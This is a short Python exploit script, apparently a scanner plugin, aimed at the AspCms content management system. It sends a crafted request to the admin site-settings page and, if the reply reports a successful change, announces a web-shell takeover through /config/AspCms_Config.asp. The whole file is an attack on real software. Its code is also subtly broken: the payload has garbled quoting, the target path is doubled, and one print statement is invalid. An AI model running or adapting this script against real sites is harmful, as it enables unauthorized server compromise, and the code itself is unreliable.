#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
find ="200 OK"
payload ="/admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves”, 1, “runMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC"

def judge(web):
    r = HttpGet(web+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if r[1].find(find)!= -1:
        return 1;
    else:
        return 2;



def main():
    if(judge(url+"/admin_aspcms/_system/AspCms_SiteSetting.asp") == 1):
        res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
        if res[0].find("修改成功")!= -1:
            print(Result+url+"存在AspCms_SiteSetting_getshell：/config/AspCms_Config.asp,访问".url+"/config/AspCms_Config.asp");

    

main()
